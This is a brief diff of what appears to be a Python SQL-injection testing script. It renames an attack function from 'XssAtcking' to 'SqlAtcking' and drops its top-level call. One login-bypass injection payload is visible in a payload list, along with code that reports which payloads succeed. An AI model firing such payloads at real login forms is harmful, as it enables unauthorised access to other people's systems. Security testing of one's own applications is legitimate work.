@@ -35,7 +35,7 @@ pay = [
     "admin'/*!50000OR*/1=1-- -"
 ]
 
-def XssAtcking():
+def SqlAtcking():
     Succes=0
     print("""
         Choice payload methods :
@@ -78,4 +78,4 @@ def XssAtcking():
         else:
             print(f"[-] Not working: {payload}")
     print(f"\n [****] Final succes amount {len(pay)}/{Succes} <=> config => {config[1]}")
-XssAtcking()
+
